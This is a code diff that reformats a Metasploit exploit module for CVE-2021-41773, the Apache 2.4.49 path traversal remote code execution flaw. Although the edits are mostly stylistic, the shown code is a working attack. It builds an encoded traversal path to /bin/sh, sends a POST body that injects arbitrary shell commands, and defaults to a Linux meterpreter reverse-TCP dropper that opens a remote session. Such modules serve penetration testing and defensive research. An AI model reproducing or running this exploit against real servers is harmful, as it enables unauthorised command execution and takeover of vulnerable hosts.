@@ -12,59 +12,68 @@ class MetasploitModule < Msf::Exploit::Remote
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'RCE Traversal in Apache 2.4.49',
-      'Description' => %q{
-        This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
-        If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
-        it can be used to execute arbitrary commands (Remote Command Execution).
-      },
-      'References' => [
-        ['CVE', '2021-41773'],
-        ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
-        ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
-      ],
-      'Author' => [
-        'Ash Daulton', # Vulnerability discovery
-        'Dhiraj Mishra', # Metasploit auxiliary module
-        'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
-      ],
-      'DisclosureDate' => '2021-05-10',
-      'License' => MSF_LICENSE,
-      'Platform' => ['unix', 'linux'],
-      'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
-      'DefaultOptions' => {
-        'CheckModule' => 'auxiliary/scanner/http/apache_traversal_rce_scanner',
-        'RPORT' => 443,
-        'SSL' => true
-      },
-      'Targets' => [
-        ['Automatic (Dropper)',
-          'Platform' => 'linux',
-          'Arch' => [ARCH_X64, ARCH_X86],
-          'Type' => :linux_dropper,
-          'DefaultOptions' => {
-            'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
-            'DisablePayloadHandler' => 'false'
-          }
+    super(
+      update_info(
+        info,
+        'Name' => 'Apache 2.4.49 Traversal RCE',
+        'Description' => %q{
+          This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
+          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
+          it can be used to execute arbitrary commands (Remote Command Execution).
+        },
+        'References' => [
+          ['CVE', '2021-41773'],
+          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
+          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
         ],
-        ['Unix Command (In-Memory)',
-          'Platform' => 'unix',
-          'Arch' => ARCH_CMD,
-          'Type' => :unix_command,
-          'DefaultOptions' => {
-            'PAYLOAD' => 'cmd/unix/generic',
-            'DisablePayloadHandler' => 'true'
-          }
+        'Author' => [
+          'Ash Daulton', # Vulnerability discovery
+          'Dhiraj Mishra', # Metasploit auxiliary module
+          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
         ],
-      ],
-      'DefaultTarget' => 0,
-      'Notes' => {
-        'Stability' => [CRASH_SAFE],
-        'Reliability' => [REPEATABLE_SESSION],
-        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
-      }
-    ))
+        'DisclosureDate' => '2021-05-10',
+        'License' => MSF_LICENSE,
+        'Platform' => ['unix', 'linux'],
+        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
+        'DefaultOptions' => {
+          'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',
+          'RPORT' => 443,
+          'SSL' => true
+        },
+        'Targets' => [
+          [
+            'Automatic (Dropper)',
+            {
+              'Platform' => 'linux',
+              'Arch' => [ARCH_X64, ARCH_X86],
+              'Type' => :linux_dropper,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
+                'DisablePayloadHandler' => 'false'
+              }
+            }
+          ],
+          [
+            'Unix Command (In-Memory)',
+            {
+              'Platform' => 'unix',
+              'Arch' => ARCH_CMD,
+              'Type' => :unix_command,
+              'DefaultOptions' => {
+                'PAYLOAD' => 'cmd/unix/generic',
+                'DisablePayloadHandler' => 'true'
+              }
+            }
+          ],
+        ],
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
@@ -76,13 +85,13 @@ class MetasploitModule < Msf::Exploit::Remote
     datastore['PAYLOAD'] == 'cmd/unix/generic'
   end
 
-  def execute_command(command, opts = {})
-    traversal = ".%2e/" * datastore['DEPTH'] << '/bin/sh'
+  def execute_command(command, _opts = {})
+    traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'
 
-    uri = normalize_uri(datastore['TARGETURI'], "#{traversal}")
+    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
     response = send_request_raw({
       'method' => 'POST',
-      'uri'    => uri,
+      'uri' => uri,
       'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}"
     })
     if response && response.body
@@ -124,7 +133,7 @@ class MetasploitModule < Msf::Exploit::Remote
       if !cmd_unix_generic?
         execute_command(payload.encoded)
       else
-        received = execute_command("#{payload.encoded}")
+        received = execute_command(payload.encoded.to_s)
 
         print_warning(message('Dumping command output in response'))
         if !received
